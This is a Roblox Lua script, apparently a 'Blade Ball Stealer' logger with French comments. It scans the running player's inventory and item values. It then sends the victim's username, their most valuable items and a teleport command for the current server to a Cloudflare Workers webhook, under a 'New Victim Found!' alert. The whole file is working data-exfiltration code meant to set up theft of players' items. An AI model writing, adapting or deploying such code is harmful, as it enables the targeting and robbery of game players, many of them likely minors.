-- // SECURITE EXECUTION
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- // FONCTION D'ENVOI COMPATIBLE AVEC TON WORKER
local function sendToWorker(payload)
    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
    if requestFunc then
        local success, result = pcall(function()
            return requestFunc({
                Url = _G.webhook, -- https://eblk.anouartmjebabra.workers.dev/
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode(payload)
            })
        end)
        return success
    end
    return false
end

-- // FORMATAGE RAP
local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return (suffixIndex == 1) and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
end

-- // SCAN DE L'INVENTAIRE (SANS TRADE)
local itemsFound = {}
local totalRAP = 0

local success, err = pcall(function()
    local clientInventory = require(ReplicatedStorage.Shared.Inventory.Client).Get()
    local Replion = require(ReplicatedStorage.Packages.Replion)
    local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items
    local categories = {"Sword", "Emote", "Explosion"}

    for _, cat in ipairs(categories) do
        if clientInventory[cat] then
            for id, info in pairs(clientInventory[cat]) do
                local rap = 0
                if rapData[cat] then
                    for key, value in pairs(rapData[cat]) do
                        if string.find(key, info.Name) then
                            rap = value
                            break
                        end
                    end
                end
                
                if rap >= (_G.min_rap or 50) then
                    totalRAP = totalRAP + rap
                    table.insert(itemsFound, {Name = info.Name, RAP = rap})
                end
            end
        end
    end
end)

-- // PREPARATION DU PAYLOAD POUR LE WORKER
if #itemsFound > 0 or totalRAP > 0 then
    -- On trie par RAP
    table.sort(itemsFound, function(a, b) return a.RAP > b.RAP end)

    local itemListText = ""
    for i, item in ipairs(itemsFound) do
        if i <= 15 then
            itemListText = itemListText .. "• " .. item.Name .. " (*" .. formatNumber(item.RAP) .. "*)\n"
        end
    end

    -- Structure EXACTE attendue par ton Worker (body.auth_token, body.username, etc.)
    local workerPayload = {
        ["auth_token"] = "EBK-SS-A", -- Le token exact de ton Worker
        ["username"] = "Eblack Blade Ball Logger",
        ["content"] = (_G.pingEveryone == "Yes" and "@everyone" or "") .. " | New Victim Found!",
        ["embeds"] = {{
            ["title"] = "🎯 Inventaire Détecté",
            ["color"] = 16711680,
            ["fields"] = {
                {["name"] = "Victime 👤", ["value"] = "```" .. plr.Name .. "```", ["inline"] = true},
                {["name"] = "Total RAP 💰", ["value"] = "**" .. formatNumber(totalRAP) .. "**", ["inline"] = true},
                {["name"] = "Join Command 🔗", ["value"] = "```game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')```"},
                {["name"] = "Items 📝", ["value"] = itemListText ~= "" and itemListText or "Aucun item important."}
            },
            ["footer"] = {["text"] = "Blade Ball Stealer | Worker Bypass"}
        }}
    }

    local sent = sendToWorker(workerPayload)
    if sent then
        print("✅ Données transmises au Worker avec succès !")
    else
        print("❌ Erreur d'envoi (Vérifie ton exécuteur ou l'URL du Worker)")
    end
else
    print("⚠️ Aucun item trouvé au dessus du RAP min.")
end
